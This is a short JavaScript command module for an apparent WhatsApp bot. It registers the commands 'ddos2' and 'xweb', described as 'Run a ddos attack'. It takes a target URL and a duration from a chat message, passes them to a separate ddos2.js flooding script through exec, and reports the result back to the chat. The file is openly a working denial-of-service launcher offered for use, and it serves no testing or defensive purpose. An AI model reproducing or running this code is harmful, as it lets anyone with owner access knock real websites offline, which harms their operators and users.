// CREDIT: DGXEON, KING SAM, KUNLE
const path = require("path");
const { exec } = require("child_process");

function stressTest(url, duration, callback) {
  const scriptPath = path.join(__dirname, "../ddos2.js");
  const cmd = `node "${scriptPath}" "${url}" "${duration}"`;

  exec(cmd, (err, stdout, stderr) => {
    if (err) return callback(err.message);
    return callback(stdout || "✅ Attack executed.");
  });
}

module.exports = {
  command: ["ddos2", "xweb"],
  description: "Run a ddos attack",
  isOwner: true,
  isSudo: true,

  async run({ sock, msg, from, text }) {
    if (!text.includes("http") || text.includes("ayokunle-restapi")) {
      return sock.sendMessage(from, { text: `⚠️ Invalid URL.\n\nUsage:\n.ddos2 https://site.com 60` }, { quoted: msg });
    }

    const [url, time] = text.split(" ");
    const duration = parseInt(time) || 60;

    await sock.sendMessage(from, {
      text: `Starting DDOS:\n🔗 ${url}\nDuration: ${duration}s`,
    }, { quoted: msg });

    stressTest(url, duration, async (result) => {
      await sock.sendMessage(from, {
        text: `DDOS Result:\n${result}`,
      }, { quoted: msg });
    });
  }
};